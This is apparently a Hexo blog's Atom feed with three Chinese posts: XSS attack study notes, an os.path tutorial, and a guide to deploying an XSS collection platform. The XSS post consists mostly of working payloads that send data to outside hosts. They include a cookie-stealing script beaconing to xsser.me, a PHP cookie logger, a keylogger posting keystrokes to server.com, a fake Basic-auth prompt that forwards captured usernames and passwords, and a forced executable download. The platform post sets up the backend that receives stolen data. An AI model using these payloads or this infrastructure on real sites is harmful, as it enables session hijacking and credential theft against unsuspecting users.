<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-06-14T15:14:51.874Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xss攻击学习</title>
    <link href="http://yoursite.com/2018/06/14/xss%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/06/14/xss攻击学习/</id>
    <published>2018-06-14T15:12:45.000Z</published>
    <updated>2018-06-14T15:14:51.874Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h1><blockquote><p>xss 全称为 cross site scripting. 特指攻击者利用网站对于用户输入过滤不足的缺陷，输入可以对用户造成影响的html/js代码，从而窃取用户信息，进行病毒侵害等行为。</p></blockquote><h2 id="类型"><a class="markdownIt-Anchor" href="#类型"></a> 类型</h2><h3 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 反射型</h3><blockquote><p>将用户输入的数据通过url的形式直接或未经完善过滤就在浏览器中输出，导致浏览器执行了用户输入的代码数据</p></blockquote><h3 id="存储型"><a class="markdownIt-Anchor" href="#存储型"></a> 存储型</h3><blockquote><p>程序将用户输入的数据信息保存在了服务器端（如数据库），网页在查询数据时候，从中获取了畸形数据内容，在网页进行展示。造成xss</p></blockquote><h3 id="dom型"><a class="markdownIt-Anchor" href="#dom型"></a> DOM型</h3><blockquote><p>反射型xss的一种，不同点在于，注入的方式是根据js的DOM进行分析并注入,较为少见。</p></blockquote><h1 id="攻击"><a class="markdownIt-Anchor" href="#攻击"></a> 攻击</h1><h2 id="盗取cookies"><a class="markdownIt-Anchor" href="#盗取cookies"></a> 盗取cookies</h2><ol><li>简单的：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#js</span><br><span class="line">Document.location=&apos;https://www.xsser.me/cookies.php?cookie=&apos;+document.cookie;</span><br><span class="line"></span><br><span class="line">#php</span><br><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$log = fopen(&quot;cookies.txt&quot;,&quot;a&quot;);</span><br><span class="line">Fwrite($log,$cookie.&quot;&quot;\n&quot;)</span><br><span class="line">Fclose($log)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>复杂的：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    (new Image()).src = &apos;http://xsser.me/index.php?do=api&amp;id=RAMWD1&amp;location=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return document.location.href</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + &apos;&amp;toplocation=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return top.location.href</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + &apos;&amp;cookie=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return document.cookie</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + &apos;&amp;opener=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return (window.opener &amp;&amp; window.opener.location.href) ? window.opener.location.href : &apos;&apos;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)());</span><br><span class="line">&#125;)();</span><br><span class="line">if (&apos;&apos; == 1) &#123;</span><br><span class="line">    keep = new Image();</span><br><span class="line">    keep.src = &apos;http://xsser.me/index.php?do=keepsession&amp;id=RAMWD1&amp;url=&apos; + escape(document.location) + &apos;&amp;cookie=&apos; + escape(document.cookie)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="读取用户键盘输入"><a class="markdownIt-Anchor" href="#读取用户键盘输入"></a> 读取用户键盘输入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!js</span><br><span class="line">$(document).ready(function()</span><br><span class="line">&#123;</span><br><span class="line">    var server = &quot;http://server.com/&quot;; //接收服务器</span><br><span class="line">    var gate = &quot;data.php?data=&quot;;  //接收文件</span><br><span class="line">    var tabURL = window.location.href;</span><br><span class="line">    var keys=&apos;&apos;;</span><br><span class="line">    </span><br><span class="line">    document.onkeypress = function(e) &#123;</span><br><span class="line">      get = window.event?event:e;</span><br><span class="line">      key = get.keyCode?get.keyCode:get.charCode;</span><br><span class="line">      key = String.fromCharCode(key);</span><br><span class="line">      keys+=key;</span><br><span class="line">    &#125;</span><br><span class="line">    window.setInterval(function()&#123;</span><br><span class="line">      new Image().src = server+gate+keys;</span><br><span class="line">      keys = &apos;&apos;;</span><br><span class="line">    &#125;, 1000);        </span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">#!php</span><br><span class="line">&lt;?php</span><br><span class="line">$txt = $_GET[&apos;data&apos;];</span><br><span class="line">$log = fopen(&quot;keylog.txt&quot;, &quot;a&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">fwrite($log, $txt);</span><br><span class="line">fclose($log);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="网络钓鱼攻击"><a class="markdownIt-Anchor" href="#网络钓鱼攻击"></a> 网络钓鱼攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;script src=&quot;http://192.168.31.63/authtest.php?id=RAMWD1&amp;info=age%2Cmonth&quot;&gt;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">#php</span><br><span class="line">&lt;?</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ((!isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) || (!isset($_SERVER[&apos;PHP_AUTH_PW&apos;]))) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    header(&apos;WWW-Authenticate: Basic realm=&quot;&apos;.addslashes(trim($_GET[&apos;info&apos;])).&apos;&quot;&apos;);</span><br><span class="line"></span><br><span class="line">    header(&apos;HTTP/1.0 401 Unauthorized&apos;);</span><br><span class="line"></span><br><span class="line">    echo &apos;Authorization Required.&apos;;</span><br><span class="line"></span><br><span class="line">    exit;</span><br><span class="line"></span><br><span class="line">&#125; else if ((isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) &amp;&amp; (isset($_SERVER[&apos;PHP_AUTH_PW&apos;])))&#123;</span><br><span class="line"></span><br><span class="line">header(&quot;Location: http://192.168.31.63/index.php?do=api&amp;id=&#123;$_GET[id]&#125;&amp;username=&#123;$_SERVER[PHP_AUTH_USER]&#125;&amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;&quot;); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="fish.jpg" alt=""><br><img src="xssplatform.jpg" alt=""></p><h2 id="beef框架"><a class="markdownIt-Anchor" href="#beef框架"></a> Beef框架</h2><blockquote><p>BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.</p></blockquote><h2 id="xss蠕虫"><a class="markdownIt-Anchor" href="#xss蠕虫"></a> xss蠕虫</h2><blockquote><p>其实是CSRF和xss的结合。利用XHR，另找时间研究学习一下。</p></blockquote><h2 id="强制软件下载"><a class="markdownIt-Anchor" href="#强制软件下载"></a> 强制软件下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line">$(document).ready(function()</span><br><span class="line">&#123;</span><br><span class="line">    var server = &quot;http://server.com/&quot;; //服务器</span><br><span class="line">    var gate = &quot;/test/test.exe&quot;; //要下载的文件</span><br><span class="line">    var tabURL = window.location.href;</span><br><span class="line"></span><br><span class="line">    var link = document.createElement(&apos;a&apos;);</span><br><span class="line">    link.href = server+gate;</span><br><span class="line">    link.download = &apos;&apos;;</span><br><span class="line">    document.body.appendChild(link);</span><br><span class="line">    link.click();    </span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念&quot;&gt;&lt;/a&gt; 概念&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;xss 全称为 cross site scripting. 特指攻击者利用网站对于用户输入过滤不足的缺陷，输入可以对用
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="xss" scheme="http://yoursite.com/categories/security/xss/"/>
    
    
  </entry>
  
  <entry>
    <title>python模块-os.path</title>
    <link href="http://yoursite.com/2018/06/14/python%E6%A8%A1%E5%9D%97-os-path/"/>
    <id>http://yoursite.com/2018/06/14/python模块-os-path/</id>
    <published>2018-06-14T14:02:49.000Z</published>
    <updated>2018-06-14T14:03:26.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>涉及到文件和文件夹的操作的一般有三个模块</p></blockquote><ol><li>os</li><li>os.path</li><li>shutil</li></ol><h1 id="ospath"><a class="markdownIt-Anchor" href="#ospath"></a> os.path</h1><blockquote><p>os.path 模块，顾名思义就是针对于系统的文件路径啊，判断是否为文件啊等等行为做出处理的模块。</p></blockquote><ol><li>os.path.abspath(path)</li></ol><blockquote><p>返回<mark>当前绝对路径+path参数</mark>的字符</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.abspath(&apos;.&apos;)</span><br><span class="line">&apos;/Users/xxxx&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.abspath(&apos;~&apos;)</span><br><span class="line">&apos;/Users/xxxx/~&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.abspath(&apos;logs&apos;)</span><br><span class="line">&apos;/Users/xxxx/logs&apos;</span><br></pre></td></tr></table></figure><ol start="2"><li>os.path.basename(path)</li></ol><blockquote><p>返回路径下面的文件名的字符串。(这个文件路径可能不存在)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.basename(&apos;/user/johnw/test.txt&apos;)</span><br><span class="line"># &apos;test.txt&apos;</span><br></pre></td></tr></table></figure><ol start="3"><li>os.path.commonpath([path1,path2])</li></ol><blockquote><p>接受一个序列，得到两个字符串中相同的文件路径（一定要是路径字符串）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.commonpath([&apos;/user/johnw/log.txt&apos;,&apos;/user/johnw/logs/test.txt&apos;])</span><br><span class="line">&apos;/user/johnw&apos;</span><br></pre></td></tr></table></figure><ol start="4"><li>os.path.commonprefix([path1,path2])</li></ol><blockquote><p>顾名思义，接受路径字符的序列，比较前缀</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.commonprefix([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])</span><br><span class="line">&apos;/usr/l&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; os.path.commonpath([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])</span><br><span class="line">&apos;/usr&apos;</span><br></pre></td></tr></table></figure><ol start="5"><li>os.path.dirname(path)</li></ol><blockquote><p>返回路径字符串中的关于文件夹的路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/&apos;)</span><br><span class="line">&apos;/usr/local/src&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/test.txt&apos;)</span><br><span class="line">&apos;/usr/local/src&apos;</span><br></pre></td></tr></table></figure><ol start="6"><li>os.path.exists(path)</li></ol><blockquote><p>判断文件路径是否真实存在</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.exists(&apos;/usr/local/src&apos;)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; os.path.exists(&apos;/usr/local&apos;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; os.path.exists(&apos;/usr/local/sbin&apos;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><ol start="7"><li>os.path.expanduser(path)</li></ol><blockquote><p>把path中包含的&quot;<sub>&quot;和&quot;</sub>user&quot;转换成用户目录</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.expanduser(&apos;~&apos;)</span><br><span class="line">&apos;/Users/xxx&apos;</span><br></pre></td></tr></table></figure><ol start="8"><li>os.path.expandvars(path)</li></ol><blockquote><p>根据环境变量，替换路径存在的$name 和 ${name} 的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.expandvars(&apos;$PYENV_ROOT&apos;)</span><br><span class="line">&apos;/Users/xxx/.pyenv&apos;</span><br></pre></td></tr></table></figure><ol start="9"><li>os.path.getatime(path)</li><li>os.path.getmtime(path)</li><li>os.path.getctime(path)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">文件的 Access time，atime 是在读取文件或者执行文件时更改的任何对inode的访问都会使此处改变。</span><br><span class="line"></span><br><span class="line">文件的Modified time，mtime 是在写入文件时随文件内容的更改而更改的。</span><br><span class="line"></span><br><span class="line">文件的 Change time，ctime 是在写入文件、更改所有者、权限或链接设置时随 Inode 的内容更改而更改的。只要stat出来的内容发生改变就会发生改变。mtime的改变必然导致ctime的改变。</span><br><span class="line"></span><br><span class="line">文件夹的 Access time，atime 是在读取文件或者执行文件时更改的（我们只cd进入一个目录然后cd ..不会引起atime的改变，但ls一下就不同了）。</span><br><span class="line"></span><br><span class="line">文件夹的 Modified time，mtime 是在文件夹中有文件的新建、删除才会改变</span><br><span class="line"></span><br><span class="line">文件夹的 Change time，ctime 基本同文件的ctime，其体现的是inode的change time。</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; os.path.getatime(&apos;/Users/xxxx/demo.py&apos;)</span><br><span class="line">1524670536.2193816</span><br></pre></td></tr></table></figure><ol start="12"><li>os.path.getsize(path)</li></ol><blockquote><p>得到文件的大小。 以bytes为单位。如果不存在或者路径错误，返回OSError</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[21:31:34] xxx ➜ ~» ls -hl demo.py </span><br><span class="line">-rw-r--r--  1 xxxx  staff    21B Apr 25 23:35 demo.py</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; os.path.getsize(&apos;/Users/wenzhongwei/demo.py&apos;)</span><br><span class="line">21</span><br></pre></td></tr></table></figure><ol start="13"><li>os.path.isabs(path)</li></ol><blockquote><p>如果是绝对路径，返回True</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.isabs(&apos;/user&apos;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><ol start="14"><li>os.path.isfile(path)</li><li>os.path.isdir(path)</li><li>os.path.islink(path)</li><li>os.path.ismount(path)</li></ol><blockquote><p>顾名思义，判断语句.会先判断这个路径字符是否真实存在，如果不存在，返回False</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.isfile(&apos;/user/text.txt&apos;)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; os.path.isfile(&apos;/Users/xxx/demo.py&apos;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><ol start="18"><li>os.path.join(path)</li></ol><blockquote><p>将字符拼接成合适的字符路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.join(&apos;usr&apos;,&apos;src&apos;)</span><br><span class="line">&apos;usr/src&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;/usr&apos;,&apos;src&apos;)</span><br><span class="line">&apos;/usr/src&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;C:&apos;,&apos;src&apos;)</span><br><span class="line">&apos;C:/src&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;c:&apos;,&apos;src&apos;)</span><br><span class="line">&apos;c:/src&apos;</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;test&apos;,&apos;.src&apos;)</span><br><span class="line">&apos;test/.src&apos;</span><br></pre></td></tr></table></figure><ol start="19"><li>os.path.normcase(path)</li><li>os.path.normpath(path)</li></ol><blockquote><p>格式化字符路径，使之符合当前系统格式</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.normcase(&apos;/User/local&apos;)</span><br><span class="line">&apos;/User/local&apos;</span><br></pre></td></tr></table></figure><ol start="21"><li>os.path.realpath(path)</li></ol><blockquote><p>返回字符路径的真实路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.realpath(&apos;.&apos;)</span><br><span class="line">&apos;/Users/xxx&apos;</span><br></pre></td></tr></table></figure><ol start="22"><li>os.path.relpath(path)</li></ol><blockquote><p>返回相对路径</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.relpath(&apos;/Users/xxx&apos;)</span><br><span class="line">&apos;.&apos;</span><br></pre></td></tr></table></figure><ol start="23"><li>os.path.samefile(path1,path2)</li></ol><blockquote><p>如果两个文件名都是指向同一个文件的话，返回True，this is determined by the device number and i-node number</p></blockquote><ol start="24"><li><p>os.path.sameopenfile(fp1,fp2)</p></li><li><p>os.path.split(path)</p></li></ol><blockquote><p>切割成 路径 ， 文件名</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.split(&apos;/usr/local/test.txt&apos;)</span><br><span class="line">(&apos;/usr/local&apos;, &apos;test.txt&apos;)</span><br></pre></td></tr></table></figure><ol start="26"><li>os.path.splitext(path)</li></ol><blockquote><p>切割成路径 ， 后缀名</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.splitext(&apos;/usr/local/test.txt&apos;)</span><br><span class="line">(&apos;/usr/local/test&apos;, &apos;.txt&apos;)</span><br></pre></td></tr></table></figure><ol start="27"><li>os.path.supports_unicode_filename</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;涉及到文件和文件夹的操作的一般有三个模块&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;os&lt;/li&gt;
&lt;li
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="modules" scheme="http://yoursite.com/categories/python/modules/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS平台的搭建</title>
    <link href="http://yoursite.com/2018/06/14/XSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2018/06/14/XSS平台的搭建/</id>
    <published>2018-06-14T12:20:09.000Z</published>
    <updated>2018-06-14T12:20:42.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lnmp环境搭建"><a class="markdownIt-Anchor" href="#lnmp环境搭建"></a> lnmp环境搭建</h1><h3 id="下载"><a class="markdownIt-Anchor" href="#下载"></a> 下载</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://lnmp.org/download.html</span><br><span class="line"></span><br><span class="line">tar -zxvf lnmp1.5-full.tar.gz</span><br><span class="line">./install.sh lnmp</span><br><span class="line">或者</span><br><span class="line">./install.sh lamp</span><br></pre></td></tr></table></figure><h1 id="xss平台"><a class="markdownIt-Anchor" href="#xss平台"></a> XSS平台</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. 下载xss平台</span><br><span class="line">https://git.oschina.net/nMask/Resource/raw/master/xss.me.new.zip</span><br><span class="line"></span><br><span class="line">2. 数据库配置</span><br><span class="line">打开phpmyadmin，</span><br><span class="line">新建数据库 poppy</span><br><span class="line">将解压出来的xss.sql移动到 phpmyadmin/upload 目录下面</span><br><span class="line">在phpmyadmin选择导入，执行。成功导入数据库</span><br><span class="line"></span><br><span class="line">3.config.php</span><br><span class="line"></span><br><span class="line">$config[&apos;register&apos;] = &apos;normal&apos; //invite需要邀请码</span><br><span class="line"></span><br><span class="line">$config[&apos;dBPwd&apos;]=&apos;xxx&apos;</span><br><span class="line">$config[&apos;urlroot&apos;] = 192.168.31.xx</span><br></pre></td></tr></table></figure><h1 id="xss_url-为404"><a class="markdownIt-Anchor" href="#xss_url-为404"></a> xss_url 为404</h1><h3 id="nginx-的解决方式"><a class="markdownIt-Anchor" href="#nginx-的解决方式"></a> nginx 的解决方式</h3><ol><li>通过转换.htaccess: <a href="http://www.anilcetin.com/convert-apache-htaccess-to-nginx/" target="_blank" rel="noopener">http://www.anilcetin.com/convert-apache-htaccess-to-nginx/</a></li><li>将转换后的内容写入/usr/local/nginx/config/my.conf</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)$&quot; /index.php?do=code&amp;urlKey=$1 last;</span><br><span class="line">rewrite ^/do/auth/(w+?)(/domain/([w.]+?))?$ /;</span><br><span class="line">rewrite ^/register/(.*?)$ /index.php?do=register&amp;key=$1 last;</span><br><span class="line">rewrite ^/register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="apache的解决方式新增-htaccess"><a class="markdownIt-Anchor" href="#apache的解决方式新增-htaccess"></a> apache的解决方式,新增 .htaccess</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteBase /</span><br><span class="line">RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L] </span><br><span class="line">RewriteRule ^do/auth/(w+?)(/domain/([w.]+?))?$  /index.php?do=do&amp;auth=$1&amp;domain=$3 [L] </span><br><span class="line">RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L] </span><br><span class="line">RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>然后修改apache的配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride None ==&gt; AllowOverride All</span><br></pre></td></tr></table></figure><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://thief.one/2017/03/15/Xss%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">https://thief.one/2017/03/15/Xss平台搭建小记/</a></p><p><a href="https://zhuanlan.zhihu.com/p/27020543" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/27020543</a></p>]]></content>
    
    <summary type="html">
    
      
      
